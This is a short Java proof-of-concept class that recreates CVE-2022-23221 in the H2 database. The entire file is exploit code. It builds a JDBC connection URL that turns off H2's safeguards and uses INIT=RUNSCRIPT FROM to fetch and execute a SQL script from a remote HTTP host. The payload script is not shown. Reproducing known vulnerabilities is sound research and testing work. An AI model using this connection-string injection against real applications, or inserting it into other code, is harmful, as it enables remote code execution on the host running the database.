package com.anonuser;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class H2_CVE_2022_23221 {

    public static void main(String[] args) {

        // Executes the command in the exploit.sql script
        try {
            System.out.println("Recreating CVE-2022-23221");
            Connection conn = DriverManager.getConnection("jdbc:h2:mem:1337;IGNORE_UNKNOWN_SETTINGS=TRUE;" +
                    "FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM 'http://0.0.0.0:7000/exploit.sql';");
            System.out.println("Database test created");
            conn.close();
        } catch (SQLException e) {
            throw new RuntimeException(e);
        }
    }
}
